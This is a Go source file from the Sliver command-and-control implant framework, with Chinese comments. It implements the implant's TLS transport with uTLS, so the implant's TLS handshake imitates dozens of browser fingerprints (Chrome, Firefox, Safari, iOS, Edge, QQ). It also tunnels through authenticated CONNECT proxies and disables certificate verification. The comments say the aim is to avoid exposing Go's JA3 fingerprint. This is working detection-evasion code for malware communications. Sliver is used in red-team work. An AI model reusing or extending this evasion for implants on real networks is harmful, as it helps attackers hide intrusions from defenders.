package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .HTTPC2ImplantConfig.TlsEnabled}}

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"

	utls "github.com/refraction-networking/utls"

	// {{if .Config.Debug}}
	"log"

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	// {{end}}
)

// 构建期由 C2 Profile 模板注入:
//   - Tier 1: tlsClientHelloID 为预设名(与 server/configs.TLSClientHelloPresets 保持一致)
//   - Tier 2: tlsCustomSpecJSON 非空时以 HelloCustom + ApplyPreset 生效,覆盖预设
var (
	tlsClientHelloID  = "{{.HTTPC2ImplantConfig.TlsClientHelloID}}"
	tlsCustomSpecJSON = `{{.HTTPC2ImplantConfig.TlsCustomSpecJSON}}`
)

var (
	ErrUnknownTLSHello  = errors.New("unknown TLS ClientHello preset")
	ErrInvalidTLSSpec   = errors.New("invalid TLS ClientHello spec json")
	ErrProxyUnsupported = errors.New("uTLS driver only supports http/https CONNECT proxies")
)

// tlsClientHelloPresets - 与 server/configs/http-c2.go 的 TLSClientHelloPresets 保持同步。
// 服务端在 SaveHTTPC2Profile 时已做白名单校验,这里解析失败时 fail closed,
// 绝不回退原生 crypto/tls(那会泄露 Go 的 JA3)。
func tlsClientHelloPresets() map[string]utls.ClientHelloID {
	return map[string]utls.ClientHelloID{
		"chrome_auto": utls.HelloChrome_Auto,
		"chrome_58":   utls.HelloChrome_58,
		"chrome_62":   utls.HelloChrome_62,
		"chrome_70":   utls.HelloChrome_70,
		"chrome_72":   utls.HelloChrome_72,
		"chrome_83":   utls.HelloChrome_83,
		"chrome_87":   utls.HelloChrome_87,
		"chrome_96":   utls.HelloChrome_96,
		"chrome_100":  utls.HelloChrome_100,
		"chrome_102":  utls.HelloChrome_102,

		"chrome_106_shuffle":          utls.HelloChrome_106_Shuffle,
		"chrome_100_psk":              utls.HelloChrome_100_PSK,
		"chrome_112_psk_shuffle":      utls.HelloChrome_112_PSK_Shuf,
		"chrome_114_padding_psk_shuf": utls.HelloChrome_114_Padding_PSK_Shuf,
		"chrome_115_pq":               utls.HelloChrome_115_PQ,
		"chrome_115_pq_psk":           utls.HelloChrome_115_PQ_PSK,
		"chrome_120":                  utls.HelloChrome_120,
		"chrome_120_pq":               utls.HelloChrome_120_PQ,
		"chrome_131":                  utls.HelloChrome_131,
		"chrome_133":                  utls.HelloChrome_133,

		"firefox_auto": utls.HelloFirefox_Auto,
		"firefox_55":   utls.HelloFirefox_55,
		"firefox_56":   utls.HelloFirefox_56,
		"firefox_63":   utls.HelloFirefox_63,
		"firefox_65":   utls.HelloFirefox_65,
		"firefox_99":   utls.HelloFirefox_99,
		"firefox_102":  utls.HelloFirefox_102,
		"firefox_105":  utls.HelloFirefox_105,
		"firefox_120":  utls.HelloFirefox_120,

		"safari_auto": utls.HelloSafari_Auto,
		"safari_16_0": utls.HelloSafari_16_0,

		"ios_auto": utls.HelloIOS_Auto,
		"ios_11_1": utls.HelloIOS_11_1,
		"ios_12_1": utls.HelloIOS_12_1,
		"ios_13":   utls.HelloIOS_13,
		"ios_14":   utls.HelloIOS_14,

		"android_11_okhttp": utls.HelloAndroid_11_OkHttp,

		"edge_auto": utls.HelloEdge_Auto,
		"edge_85":   utls.HelloEdge_85,
		"edge_106":  utls.HelloEdge_106,

		"360_auto": utls.Hello360_Auto,
		"360_7_5":  utls.Hello360_7_5,
		"360_11_0": utls.Hello360_11_0,

		"qq_auto": utls.HelloQQ_Auto,
		"qq_11_1": utls.HelloQQ_11_1,

		"randomized":         utls.HelloRandomized,
		"randomized_alpn":    utls.HelloRandomizedALPN,
		"randomized_no_alpn": utls.HelloRandomizedNoALPN,
	}
}

// resolveClientHello - 解析 profile 中的指纹配置。
// 优先级:TlsCustomSpecJSON(Tier 2)> TlsClientHelloID(Tier 1)。
func resolveClientHello() (utls.ClientHelloID, *utls.ClientHelloSpec, error) {
	if strings.TrimSpace(tlsCustomSpecJSON) != "" {
		spec := &utls.ClientHelloSpec{}
		if err := spec.UnmarshalJSON([]byte(tlsCustomSpecJSON)); err != nil {
			return utls.ClientHelloID{}, nil, fmt.Errorf("%w: %s", ErrInvalidTLSSpec, err)
		}
		return utls.HelloCustom, spec, nil
	}
	if id, ok := tlsClientHelloPresets()[tlsClientHelloID]; ok {
		return id, nil, nil
	}
	return utls.ClientHelloID{}, nil, fmt.Errorf("%w: %q", ErrUnknownTLSHello, tlsClientHelloID)
}

// utlsDialTLSContext - 返回 http.Transport.DialTLSContext 实现。
// 注意:transport 在 DialTLSContext 存在时会忽略 Proxy 字段,因此代理的
// CONNECT 隧道必须在这里自行建立;socks 代理无法与 uTLS 组合,fail closed。
func utlsDialTLSContext(opts *HTTPOptions, proxyURL *url.URL) func(ctx context.Context, network, addr string) (net.Conn, error) {
	return func(ctx context.Context, network, addr string) (net.Conn, error) {
		dialer := &net.Dialer{Timeout: opts.NetTimeout}
		conn, err := dialTarget(ctx, dialer, addr, proxyURL, opts)
		if err != nil {
			return nil, err
		}
		host, _, err := net.SplitHostPort(addr)
		if err != nil {
			conn.Close()
			return nil, err
		}
		tlsConfig := &utls.Config{
			ServerName:         host,
			InsecureSkipVerify: true, // 与原生驱动一致:不校验服务端证书
		}
		// {{if .Config.Debug}}
		if cryptography.TLSKeyLogger != nil {
			tlsConfig.KeyLogWriter = cryptography.TLSKeyLogger
		}
		// {{end}}
		helloID, spec, err := resolveClientHello()
		if err != nil {
			conn.Close()
			// {{if .Config.Debug}}
			log.Printf("[utls] fingerprint resolve failed (fail closed, no native fallback): %s", err)
			// {{end}}
			return nil, err
		}
		uconn := utls.UClient(conn, tlsConfig, helloID)
		if spec != nil {
			if err := uconn.ApplyPreset(spec); err != nil {
				conn.Close()
				return nil, fmt.Errorf("%w: %s", ErrInvalidTLSSpec, err)
			}
		}
		// transport 对非 *tls.Conn 不会代劳握手与 TLSHandshakeTimeout,需自行完成
		handshakeCtx, cancel := context.WithTimeout(ctx, opts.TlsTimeout)
		defer cancel()
		if err := uconn.HandshakeContext(handshakeCtx); err != nil {
			conn.Close()
			// {{if .Config.Debug}}
			log.Printf("[utls] handshake failed: %s", err)
			// {{end}}
			return nil, err
		}
		return uconn, nil
	}
}

// dialTarget - 直连目标,或经 http/https 代理建立 CONNECT 隧道
func dialTarget(ctx context.Context, dialer *net.Dialer, target string, proxyURL *url.URL, opts *HTTPOptions) (net.Conn, error) {
	if proxyURL == nil {
		return dialer.DialContext(ctx, "tcp", target)
	}
	switch strings.ToLower(proxyURL.Scheme) {
	case "http", "https", "":
		break
	default:
		// socks 等需要 transport 内建支持,与 DialTLSContext 互斥;宁可失败也不绕过代理
		return nil, ErrProxyUnsupported
	}
	proxyAddr := proxyURL.Host
	if !strings.Contains(proxyAddr, ":") {
		proxyAddr += ":80"
		if strings.EqualFold(proxyURL.Scheme, "https") {
			proxyAddr = proxyURL.Host + ":443"
		}
	}
	conn, err := dialer.DialContext(ctx, "tcp", proxyAddr)
	if err != nil {
		return nil, err
	}
	if strings.EqualFold(proxyURL.Scheme, "https") {
		// 到代理这一跳用原生 TLS(代理侧可见的指纹与 C2 侧无关)
		tlsConn := tlsClientToProxy(proxyAddr, conn)
		if err := tlsConn.HandshakeContext(ctx); err != nil {
			conn.Close()
			return nil, err
		}
		conn = tlsConn
	}
	if err := sendConnect(ctx, conn, target, proxyURL, opts); err != nil {
		conn.Close()
		return nil, err
	}
	return conn, nil
}

// tlsClientToProxy - 到 https 代理这一跳使用原生 crypto/tls(该跳指纹由代理可见,
// 与 C2 侧 JA3/JA4 无关),握手由调用方完成。
func tlsClientToProxy(proxyAddr string, conn net.Conn) *tls.Conn {
	host, _, err := net.SplitHostPort(proxyAddr)
	if err != nil {
		host = proxyAddr
	}
	return tls.Client(conn, &tls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
	})
}

func sendConnect(ctx context.Context, conn net.Conn, target string, proxyURL *url.URL, opts *HTTPOptions) error {
	host := target
	if !strings.Contains(host, ":") {
		host += ":443"
	}
	req := &http.Request{
		Method: http.MethodConnect,
		URL:    &url.URL{Opaque: host},
		Host:   host,
		Header: make(http.Header),
	}
	req.Header.Set("User-Agent", userAgent)
	// 认证信息:优先 C2 URI 的 proxy-username/password,其次代理 URL 的 userinfo
	username, password := opts.ProxyUsername, opts.ProxyPassword
	if username == "" && proxyURL.User != nil {
		username = proxyURL.User.Username()
		password, _ = proxyURL.User.Password()
	}
	if username != "" {
		token := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))
		req.Header.Set("Proxy-Authorization", "Basic "+token)
	}
	if err := req.Write(conn); err != nil {
		return err
	}
	// 与 net/http 内建 CONNECT 相同的读取方式:只消费响应头,不预读隧道数据
	reader := bufio.NewReader(conn)
	resp, err := http.ReadResponse(reader, req)
	if err != nil {
		return err
	}
	if err := resp.Body.Close(); err != nil {
		return err
	}
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("proxy CONNECT failed: %s", resp.Status)
	}
	return nil
}

// {{end}} -TlsEnabled
